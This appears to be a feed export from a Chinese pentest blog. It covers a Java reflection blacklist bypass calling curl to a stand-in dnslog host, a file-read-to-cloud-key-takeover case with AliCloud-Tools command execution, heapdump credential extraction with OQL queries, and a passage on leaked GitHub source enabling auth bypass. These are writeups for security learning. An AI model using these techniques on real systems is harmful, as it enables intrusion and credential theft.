class="code"><pre><span class="line"><span class="number">1.</span>getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><blockquote><p>Code-Breaking 2018中某道题的第三方Writup：<a href="http://rui0.cn/archives/1015">http://rui0.cn/archives/1015</a></p></blockquote><p>在JAVA中可以通过下面代码来执行命令，但在题目中使用了黑名单</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-9elmn2lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-9elmn2lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;curl xxx.dnslog.cn&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>使用反射来构造一条调用链，这样就可以在关键字处使用字符串拼接来达到绕过黑名单的效果</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-rb8uo0lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-rb8uo0lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)), <span class="string">&quot;curl xxx.dnslog.cn);</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></div></figure><p>整理一下比较容易理解：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-4tckillr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-4tckillr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass()            <span class="comment">// 获取 Class 对象</span></span><br><span class="line">.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)      <span class="comment">// 获取 Runtime 对象</span></span><br><span class="line">.getMethod(<span class="string">&quot;exec&quot;</span>, String.class)   <span class="comment">// 获取 exec 方法</span></span><br><span class="line">.invoke(                           <span class="comment">// 反射调用 exec 方法</span></span><br><span class="line">    String.class.getClass()        <span class="comment">// 同上,获取并调用 getRuntime 方法</span></span><br><span class="line">    .forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">    .getMethod(<span class="string">&quot;getRuntime&quot;</span>)</span><br><span class="line">    .invoke(                       <span class="comment">// 同上,获取 Runtime 对象</span></span><br><span class="line">        String.class.getClass()</span><br><span class="line">    .forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">    ), </span><br><span class="line">  <span class="string">&quot;curl xxx.dnslog.cn&quot;</span>             <span class="comment">// exec 方法参数</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>完整代码：</li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-tfd7cflr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-tfd7cflr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec(&quot;curl xxx.dnslog.cn&quot;)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String.class.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">                String.class.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(</span><br><span class="line">                    String.class.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">                ), <span class="string">&quot;curl xxx.dnslog.cn&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>参考文章：<ul><li><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html">java.lang.Class</a></li><li><a href="https://github.com/phith0n/JavaThings">Java安全漫谈</a></li><li><a href="https://forum.butian.net/share/1333">Java反序列化学习之反射</a></li><li><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从文件读取到RCE再到多台机器权限</title>
      <link href="/posts/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90.html"/>
      <url>/posts/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>攻击路径：接口Fuzz &gt; 任意文件读取 &gt; 历史命令 &gt; 读取配置文件 &gt; 密钥利用</p></blockquote><h2 id="接口Fuzz"><a href="#接口Fuzz" class="headerlink" title="接口Fuzz"></a>接口Fuzz</h2><p>开局一个管理后台，通过浏览器插件抓到部分接口</p><p><a data-fancybox="gallery" data-src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-1.png" data-caption="从文件读取到RCE再到多台机器权限-1"><img src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-1.png" alt="从文件读取到RCE再到多台机器权限-1"></a></p><p>将接口保存下来，并导入Burp进行爆破，发现一个下载文件的接口</p><p><a data-fancybox="gallery" data-src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-2.png" data-caption="从文件读取到RCE再到多台机器权限-2"><img src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-2.png" alt="从文件读取到RCE再到多台机器权限-2"></a></p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><ul><li>尝试读取<code>/etc/passwd</code>，发现可以成功读到信息</li></ul><p><a data-fancybox="gallery" data-src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-3.png" data-caption="从文件读取到RCE再到多台机器权限-3"><img src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-3.png" alt="从文件读取到RCE再到多台机器权限-3"></a></p><ul><li>读取<code>.bash_history</code>历史命令，发现存在一个<code>/aaa/bbb/xxx.xml</code>配置文件</li></ul><p><a data-fancybox="gallery" data-src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-4.png" data-caption="从文件读取到RCE再到多台机器权限-4"><img src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-4.png" alt="从文件读取到RCE再到多台机器权限-4"></a></p><ul><li>读取该配置文件，得到大量配置信息，以及一个比较关键的<code>AccessKey</code>和<code>SecretKey</code></li></ul><p><a data-fancybox="gallery" data-src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-5.png" data-caption="从文件读取到RCE再到多台机器权限-5"><img src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-5.png" alt="从文件读取到RCE再到多台机器权限-5"></a></p><p><a data-fancybox="gallery" data-src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-6.png" data-caption="从文件读取到RCE再到多台机器权限-6"><img src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-6.png" alt="从文件读取到RCE再到多台机器权限-6"></a></p><h2 id="密钥利用"><a href="#密钥利用" class="headerlink" title="密钥利用"></a>密钥利用</h2><p>尝试使用工具 <a href="https://github.com/iiiusky/alicloud-tools">alicloud-tools</a> 进行利用。也可以使用Gamma实验室出品的 <a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a>、<a href="https://yun.cloudbility.com/">行云管家</a>，或者直接使用<a href="https://next.api.aliyun.com/api/Ecs/">官方API调试工具</a>等工具执行命令</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-7a3i82lr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-7a3i82lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有实例信息（如实例ID）</span></span><br><span class="line">$ ./AliCloud-Tools -a &lt;AccessKey&gt; -s &lt;SecretKey&gt; ecs --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line">$ ./AliCloud-Tools -a &lt;AccessKey&gt; -s &lt;SecretKey&gt;  <span class="built_in">exec</span> -I &lt;InstanceId&gt; -c &lt;Command&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-7.png" data-caption="从文件读取到RCE再到多台机器权限-7"><img src="/assets/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0RCE%E5%86%8D%E5%88%B0%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%9D%83%E9%99%90-7.png" alt="从文件读取到RCE再到多台机器权限-7"></a></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Case </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Actuator Heapdump 堆转储文件泄露</title>
      <link href="/posts/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2.html"/>
      <url>/posts/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Heapdump</code>，即堆转储文件，是一个Java进程在某个时间点上的内存快照。<code>HeapDump</code>记录了JVM中堆内存运行的情况，保存了Java对象、类以及线程栈以及本地变量等信息。</p></blockquote><ul><li>路径：<code>/actuator/heapdump</code></li><li>工具：<ul><li><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></li><li><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></li></ul></li></ul><figure class="highlight shell"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-4lh2n6lr592jbb"></i><span>  Shell  </span><div class="collapse show" id="collapse-4lh2n6lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">heapdump_tool</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -jar heapdump_tool.jar &lt;heapdump-file&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择模式</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">0,不加载文件,速度较快但精度较低,不能用某些条件</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1,加载文件,需要花几分钟加载,可以查询heapdump中所有的数据</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关键字查询</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">password</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">secret</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取字符串中的URL/File/IP</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">geturl</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">getfile</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">getip</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置字符长度</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">len=10     <span class="comment"># 获取长度为10的所有key或者value值</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取指定顺序</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">num=1-100  <span class="comment"># 获取顺序1-100的字符</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认不输出查询结果非key-value格式的数据</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">all=<span class="literal">true</span>   <span class="comment"># 获取所有值</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">JDumpSpider</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -jar JDumpSpider.jar &lt;heapdump-file&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>0、直接使用<code>heapdump_tool.jar</code>查询关键字</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-w0x62llr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-w0x62llr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">password</span><br><span class="line">redis.server</span><br><span class="line">redis.cache</span><br><span class="line">jdbc</span><br><span class="line">AccessKey</span><br><span class="line">SecretKey</span><br><span class="line">mysql</span><br><span class="line">oracle</span><br></pre></td></tr></table></div></figure><p>1、使用JDK自带工具<code>jvisualvm</code>打开该文件。(该工具在<code>&lt;JDK_HOME&gt;/bin</code>目录下，Windows为<code>jvisualvm.exe</code>)<br>2、打开文件后已经可以看到部分敏感信息泄露<br>3、点击“类”，搜索<code>Hashtable</code><br>4、点击进入<code>Hashtable$Entry</code>，寻找敏感信息</p><figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-m9155wlr592jbb"></i><span>  Sql  </span><div class="collapse show" id="collapse-m9155wlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 部分ODL查询语句</span><br><span class="line"># 模糊查询</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.lang.String s <span class="keyword">where</span> toString(s) <span class="keyword">LIKE</span> &quot;.*SESSION*.&quot;</span><br><span class="line"></span><br><span class="line"># 查询字符串是否在Key中,返回实例ID</span><br><span class="line"><span class="keyword">select</span> s <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.key.toString())  </span><br><span class="line"></span><br><span class="line"># 查询字符串是否在Key中,返回Key全部内容</span><br><span class="line"><span class="keyword">select</span> s.key.toString() <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.key.toString())</span><br><span class="line"></span><br><span class="line"># 查询字符串是否在Key中,返回<span class="keyword">Value</span>的内容</span><br><span class="line"><span class="keyword">select</span> s.value.toString() <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.key.toString())</span><br><span class="line"></span><br><span class="line"># 查询字符串是否在<span class="keyword">Value</span>中,返回<span class="keyword">Value</span>全部内容</span><br><span class="line"><span class="keyword">select</span> s.value.toString() <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.value.toString())</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><ul><li>通过浏览器访问对应路径将<code>heapdump</code>文件进行下载</li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-0.jpg" data-caption="actuator-heapdump-堆转储文件泄露-0"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-0.jpg" alt="actuator-heapdump-堆转储文件泄露-0"></a></p><ul><li>然后使用JDK自带工具<code>JVisualVM</code>工具对其进行分析，该工具在<code>&lt;JDK_HOME&gt;/bin/</code>目录下。<ul><li><code>JVisualVM</code>是一个监视，故障排除工具</li><li>也可以使用<code>Eclipse MAT</code>对其进行分析<ul><li>参考：<a href="https://www.cnblogs.com/wyb628/p/8567610.html">Java内存泄漏分析系列之六：JVM Heap Dump（堆转储文件）的生成和MAT的使用</a></li></ul></li></ul></li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-1.jpg" data-caption="actuator-heapdump-堆转储文件泄露-1"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-1.jpg" alt="actuator-heapdump-堆转储文件泄露-1"></a></p><ul><li>其实通过<code>JVisualVM</code>加载<code>heapdump</code>文件时，已经可以看到部分敏感信息泄露</li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-2.jpg" data-caption="actuator-heapdump-堆转储文件泄露-2"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-2.jpg" alt="actuator-heapdump-堆转储文件泄露-2"></a></p><ul><li>打开后进入ODL控制台，输入如下语句，点击执行进行查询</li></ul><figure class="highlight shell"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-5dv4g5lr592jbb"></i><span>  Shell  </span><div class="collapse show" id="collapse-5dv4g5lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select s.value.toString() from java.util.Hashtable$Entry s where /password/.test(s.key.toString())</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>也可以点击”类”，搜索<code>Hashtable</code>，然后点击进入第一个<code>java.util.Hashtable$Entry</code></li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-3.jpg" data-caption="actuator-heapdump-堆转储文件泄露-3"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-3.jpg" alt="actuator-heapdump-堆转储文件泄露-3"></a><br><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-4.jpg" data-caption="actuator-heapdump-堆转储文件泄露-4"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-4.jpg" alt="actuator-heapdump-堆转储文件泄露-4"></a></p><ul><li>通过对左侧实例进行观察，这里发现了JDBC明文密码以及路径</li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-5.jpg" data-caption="actuator-heapdump-堆转储文件泄露-5"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-5.jpg" alt="actuator-heapdump-堆转储文件泄露-5"></a></p><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-6.jpg" data-caption="actuator-heapdump-堆转储文件泄露-6"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-6.jpg" alt="actuator-heapdump-堆转储文件泄露-6"></a></p><ul><li>打完收工，整理报告，提交审核。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a></li><li><a href="https://www.cnblogs.com/wyb628/p/8567610.html">Java内存泄漏分析系列之六：JVM Heap Dump（堆转储文件）的生成和MAT的使用</a></li><li><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">Springboot 获取被星号脱敏的密码的明文の方法四-测试</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Trick </tag>
            
            <tag> Case </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github源码泄漏导致权限绕过</title>
      <link href="/posts/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87.html"/>
      <url>/posts/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>某众测项目在 Github 意外发现目标某系统部分源码，通过简单审计发现存在可绕过鉴权并获取敏感信息</p></blockquote><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><ul><li>首先把源码下载下来，打开其中的<code>utils/operation_send.py</code>文件。此处通过<code>data/base.json</code>文件获取相关参数，完成鉴权并发起测试请求。关键代码如下：</li></ul><figure class="highlight python"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-zppjualr592jbb"></i><span>  Python  </span><div class="collapse show" id="collapse-zppjualr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取并计算signature</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_signature</span>(<span class="params">self</span>):</span><br><span class="line">    params = self.__params.items()</span><br><span class="line">    params = <span class="built_in">sorted</span>(params,key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>].lower())</span><br><span class="line">    <span class="comment">#生成signature</span></span><br><span class="line">    signature = base64.encodebytes(</span><br><span class="line">        hmac.new(self.__secret_key.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                 urlencode(params).lower().replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%20&#x27;</span>).replace(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;%3A&#x27;</span>).replace(<span class="string">&quot;%7E&quot;</span>,<span class="string">&#x27;~&#x27;</span>).encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                 hashlib.sha1).digest()</span><br><span class="line">    ).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(signature,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test = OperationJsonUtil(<span class="string">&quot;base&quot;</span>)</span><br><span class="line">    auth = OperationAuthUtil()</span><br><span class="line">    auth.set_params(test.get_params(<span class="string">&quot;index_list&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 